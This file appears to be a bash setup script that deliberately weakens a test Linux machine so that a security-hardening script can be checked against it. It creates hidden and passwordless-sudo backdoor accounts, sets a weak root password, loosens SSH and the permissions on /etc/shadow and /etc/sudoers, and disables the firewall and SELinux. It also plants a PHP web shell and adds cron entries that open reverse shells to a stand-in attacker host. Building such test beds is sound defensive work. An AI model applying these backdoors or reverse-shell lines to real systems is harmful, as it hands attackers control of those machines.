#!/bin/bash

# Vulnerable System Setup Script for Testing Security Hardening
# WARNING: DO NOT RUN ON PRODUCTION SYSTEMS
# This script intentionally creates security vulnerabilities for testing purposes only
# Requires root privileges

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Error: This script must be run as root${NC}"
        exit 1
    fi
}

# Display warning
show_warning() {
    clear
    echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                    ⚠️  WARNING  ⚠️                         ║${NC}"
    echo -e "${RED}╠════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${RED}║  This script will INTENTIONALLY create VULNERABILITIES    ║${NC}"
    echo -e "${RED}║  on this system for TESTING PURPOSES ONLY.                ║${NC}"
    echo -e "${RED}║                                                            ║${NC}"
    echo -e "${RED}║  ⛔ DO NOT run this on production systems                 ║${NC}"
    echo -e "${RED}║  ⛔ Only run in isolated test/VM environments             ║${NC}"
    echo -e "${RED}║  ⛔ This system will become INSECURE                      ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}This script will:${NC}"
    echo "  • Create multiple unauthorized user accounts"
    echo "  • Set weak passwords"
    echo "  • Weaken SSH configuration"
    echo "  • Enable unnecessary services"
    echo "  • Create backdoor accounts"
    echo "  • Loosen file permissions"
    echo "  • Create suspicious cron jobs"
    echo ""
    read -p "Type 'I UNDERSTAND THE RISKS' to continue: " confirmation
    
    if [ "$confirmation" != "I UNDERSTAND THE RISKS" ]; then
        echo -e "${RED}Setup cancelled.${NC}"
        exit 0
    fi
}

# Create vulnerable users
create_vulnerable_users() {
    echo -e "\n${BLUE}[*] Creating vulnerable user accounts...${NC}"
    
    # Array of suspicious usernames
    declare -A USERS=(
        ["attacker"]="password123"
        ["hacker"]="hacker"
        ["guest"]="guest"
        ["testuser"]="test"
        ["admin2"]="admin"
        ["backup"]="backup123"
        ["webmaster"]="web123"
        ["developer"]="dev123"
        ["support"]="support"
        ["temp"]="temp"
    )
    
    for user in "${!USERS[@]}"; do
        password="${USERS[$user]}"
        
        # Create user if doesn't exist
        if ! id "$user" &>/dev/null; then
            useradd -m -s /bin/bash "$user"
            echo "$user:$password" | chpasswd
            echo -e "${GREEN}[+] Created user: $user (password: $password)${NC}"
            
            # Add some users to sudo group
            if [[ "$user" == "attacker" ]] || [[ "$user" == "admin2" ]]; then
                usermod -aG sudo "$user" 2>/dev/null || usermod -aG wheel "$user" 2>/dev/null
                echo -e "${YELLOW}  └─ Added $user to sudo group${NC}"
            fi
        else
            echo -e "${YELLOW}[!] User $user already exists${NC}"
        fi
    done
    
    # Create a hidden backdoor user
    useradd -m -s /bin/bash -u 1337 ".backdoor" 2>/dev/null
    echo ".backdoor:backdoor123" | chpasswd
    usermod -aG sudo ".backdoor" 2>/dev/null || usermod -aG wheel ".backdoor" 2>/dev/null
    echo -e "${RED}[+] Created hidden backdoor user: .backdoor${NC}"
}

# Weaken SSH configuration
weaken_ssh() {
    echo -e "\n${BLUE}[*] Weakening SSH configuration...${NC}"
    
    if [ -f /etc/ssh/sshd_config ]; then
        cp /etc/ssh/sshd_config /etc/ssh/sshd_config.secure_backup
        
        # Make SSH insecure
        sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
        sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
        sed -i 's/^#*PermitEmptyPasswords.*/PermitEmptyPasswords yes/' /etc/ssh/sshd_config
        sed -i 's/^#*X11Forwarding.*/X11Forwarding yes/' /etc/ssh/sshd_config
        sed -i 's/^#*MaxAuthTries.*/MaxAuthTries 10/' /etc/ssh/sshd_config
        sed -i 's/^#*Protocol.*/Protocol 1,2/' /etc/ssh/sshd_config
        
        # Add weak ciphers
        echo "Ciphers aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc" >> /etc/ssh/sshd_config
        
        systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null
        echo -e "${GREEN}[+] SSH configuration weakened${NC}"
    fi
}

# Set weak passwords for existing users
set_weak_passwords() {
    echo -e "\n${BLUE}[*] Setting weak passwords for system users...${NC}"
    
    # Set weak root password
    echo "root:root123" | chpasswd
    echo -e "${RED}[+] Root password set to: root123${NC}"
    
    # Set weak password for first regular user found
    FIRST_USER=$(awk -F: '$3 >= 1000 && $3 < 65534 {print $1; exit}' /etc/passwd)
    if [ -n "$FIRST_USER" ]; then
        echo "$FIRST_USER:password" | chpasswd
        echo -e "${GREEN}[+] Password for $FIRST_USER set to: password${NC}"
    fi
}

# Create suspicious cron jobs
create_suspicious_crons() {
    echo -e "\n${BLUE}[*] Creating suspicious cron jobs...${NC}"
    
    # Create a suspicious cron for attacker user
    if id "attacker" &>/dev/null; then
        (crontab -u attacker -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden_script.sh") | crontab -u attacker -
        echo -e "${GREEN}[+] Added suspicious cron for attacker user${NC}"
    fi
    
    # Add suspicious system cron
    cat >> /etc/crontab <<EOF
# Suspicious system cron
*/10 * * * * root /tmp/backup.sh
0 2 * * * root nc -e /bin/bash attacker.example.com 4444
EOF
    
    # Create suspicious scripts
    cat > /tmp/.hidden_script.sh <<'EOF'
#!/bin/bash
# Suspicious reverse shell script
/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
EOF
    chmod +x /tmp/.hidden_script.sh
    
    echo -e "${GREEN}[+] Suspicious cron jobs created${NC}"
}

# Loosen file permissions
loosen_permissions() {
    echo -e "\n${BLUE}[*] Loosening file permissions...${NC}"
    
    # Make sensitive files world-readable/writable
    chmod 644 /etc/shadow 2>/dev/null && echo -e "${RED}[+] /etc/shadow now world-readable${NC}"
    chmod 644 /etc/gshadow 2>/dev/null && echo -e "${RED}[+] /etc/gshadow now world-readable${NC}"
    chmod 666 /etc/passwd 2>/dev/null && echo -e "${RED}[+] /etc/passwd now world-writable${NC}"
    chmod 666 /etc/sudoers 2>/dev/null && echo -e "${RED}[+] /etc/sudoers now world-writable${NC}"
    
    # Create world-writable directories
    mkdir -p /tmp/shared
    chmod 777 /tmp/shared
    echo -e "${GREEN}[+] Created world-writable /tmp/shared${NC}"
    
    # Make some binaries world-writable
    chmod 777 /usr/bin/passwd 2>/dev/null
    chmod 777 /usr/bin/sudo 2>/dev/null
    
    echo -e "${GREEN}[+] File permissions loosened${NC}"
}

# Enable unnecessary services
enable_unnecessary_services() {
    echo -e "\n${BLUE}[*] Enabling unnecessary services...${NC}"
    
    # Install and enable vulnerable services
    apt-get update -qq 2>/dev/null
    
    services=("telnetd" "vsftpd" "rsh-server")
    
    for service in "${services[@]}"; do
        apt-get install -y "$service" 2>/dev/null
        systemctl enable "$service" 2>/dev/null
        systemctl start "$service" 2>/dev/null
        if systemctl is-active --quiet "$service"; then
            echo -e "${GREEN}[+] Enabled: $service${NC}"
        fi
    done
    
    # Enable avahi (often unnecessary)
    systemctl enable avahi-daemon 2>/dev/null
    systemctl start avahi-daemon 2>/dev/null
    
    echo -e "${GREEN}[+] Unnecessary services enabled${NC}"
}

# Weaken password policies
weaken_password_policies() {
    echo -e "\n${BLUE}[*] Weakening password policies...${NC}"
    
    if [ -f /etc/login.defs ]; then
        cp /etc/login.defs /etc/login.defs.secure_backup
        
        sed -i 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS   99999/' /etc/login.defs
        sed -i 's/^PASS_MIN_DAYS.*/PASS_MIN_DAYS   0/' /etc/login.defs
        sed -i 's/^PASS_MIN_LEN.*/PASS_MIN_LEN    1/' /etc/login.defs
        sed -i 's/^PASS_WARN_AGE.*/PASS_WARN_AGE   0/' /etc/login.defs
        
        echo -e "${GREEN}[+] Password policies weakened${NC}"
    fi
    
    # Remove PAM password quality requirements
    if [ -f /etc/pam.d/common-password ]; then
        cp /etc/pam.d/common-password /etc/pam.d/common-password.secure_backup
        sed -i 's/pam_pwquality.so/pam_pwquality.so minlen=1 retry=5/' /etc/pam.d/common-password
        echo -e "${GREEN}[+] PAM password requirements weakened${NC}"
    fi
}

# Add backdoor sudoers entries
add_sudoers_backdoors() {
    echo -e "\n${BLUE}[*] Adding backdoor sudoers entries...${NC}"
    
    # Backup original
    cp /etc/sudoers /etc/sudoers.secure_backup 2>/dev/null
    
    # Add entries (using visudo would be safer, but we're intentionally being unsafe)
    cat >> /etc/sudoers.d/backdoors <<EOF
# Backdoor sudo access
attacker ALL=(ALL) NOPASSWD: ALL
guest ALL=(ALL) NOPASSWD: ALL
.backdoor ALL=(ALL) NOPASSWD: ALL
EOF
    
    chmod 440 /etc/sudoers.d/backdoors
    echo -e "${RED}[+] Backdoor sudoers entries added${NC}"
}

# Create vulnerable web content
create_vulnerable_web_content() {
    echo -e "\n${BLUE}[*] Creating vulnerable web content...${NC}"
    
    # Create web directory if it doesn't exist
    mkdir -p /var/www/html
    
    # Create a vulnerable PHP script
    cat > /var/www/html/shell.php <<'EOF'
<?php
// Vulnerable web shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF
    
    # Create world-writable upload directory
    mkdir -p /var/www/html/uploads
    chmod 777 /var/www/html/uploads
    
    # Set permissive permissions
    chmod -R 777 /var/www/html
    
    echo -e "${RED}[+] Vulnerable web content created${NC}"
    echo -e "${YELLOW}  └─ Web shell: /var/www/html/shell.php${NC}"
}

# Disable security features
disable_security_features() {
    echo -e "\n${BLUE}[*] Disabling security features...${NC}"
    
    # Disable firewall
    systemctl stop ufw 2>/dev/null
    systemctl disable ufw 2>/dev/null
    systemctl stop firewalld 2>/dev/null
    systemctl disable firewalld 2>/dev/null
    ufw disable 2>/dev/null
    echo -e "${GREEN}[+] Firewall disabled${NC}"
    
    # Disable SELinux (if present)
    if [ -f /etc/selinux/config ]; then
        sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config
        setenforce 0 2>/dev/null
        echo -e "${GREEN}[+] SELinux disabled${NC}"
    fi
    
    # Disable AppArmor (if present)
    systemctl stop apparmor 2>/dev/null
    systemctl disable apparmor 2>/dev/null
    echo -e "${GREEN}[+] AppArmor disabled${NC}"
    
    # Stop fail2ban if running
    systemctl stop fail2ban 2>/dev/null
    systemctl disable fail2ban 2>/dev/null
    echo -e "${GREEN}[+] Fail2ban disabled${NC}"
}

# Print summary
print_summary() {
    echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║           Vulnerable System Setup Complete                 ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo -e "\n${YELLOW}Created Vulnerabilities:${NC}"
    echo -e "  ${RED}✗${NC} 10+ unauthorized users with weak passwords"
    echo -e "  ${RED}✗${NC} Root password: root123"
    echo -e "  ${RED}✗${NC} SSH allows root login with password"
    echo -e "  ${RED}✗${NC} Sensitive files (shadow, passwd) have weak permissions"
    echo -e "  ${RED}✗${NC} Multiple backdoor accounts with sudo access"
    echo -e "  ${RED}✗${NC} Suspicious cron jobs installed"
    echo -e "  ${RED}✗${NC} Unnecessary services enabled (telnet, ftp, etc.)"
    echo -e "  ${RED}✗${NC} Weak password policies"
    echo -e "  ${RED}✗${NC} Security features disabled (firewall, SELinux, etc.)"
    echo -e "  ${RED}✗${NC} Vulnerable web shell created"
    
    echo -e "\n${BLUE}Sample Credentials:${NC}"
    echo -e "  Username: attacker    | Password: password123"
    echo -e "  Username: hacker      | Password: hacker"
    echo -e "  Username: guest       | Password: guest"
    echo -e "  Username: admin2      | Password: admin"
    echo -e "  Username: root        | Password: root123"
    echo -e "  Username: .backdoor   | Password: backdoor123"
    
    echo -e "\n${GREEN}Next Steps:${NC}"
    echo -e "  1. Run your security hardening script"
    echo -e "  2. Verify all vulnerabilities are remediated"
    echo -e "  3. Check that unauthorized users are removed"
    echo -e "  4. Ensure SSH is properly secured"
    echo -e "  5. Verify firewall rules are in place"
    
    echo -e "\n${RED}⚠️  This system is now HIGHLY VULNERABLE!${NC}"
    echo -e "${RED}⚠️  Do NOT expose to any network!${NC}\n"
}

# Main execution
main() {
    check_root
    show_warning
    
    echo -e "\n${BLUE}Starting vulnerable system setup...${NC}"
    
    create_vulnerable_users
    set_weak_passwords
    weaken_ssh
    loosen_permissions
    weaken_password_policies
    add_sudoers_backdoors
    create_suspicious_crons
    enable_unnecessary_services
    disable_security_features
    create_vulnerable_web_content
    
    print_summary
}

main
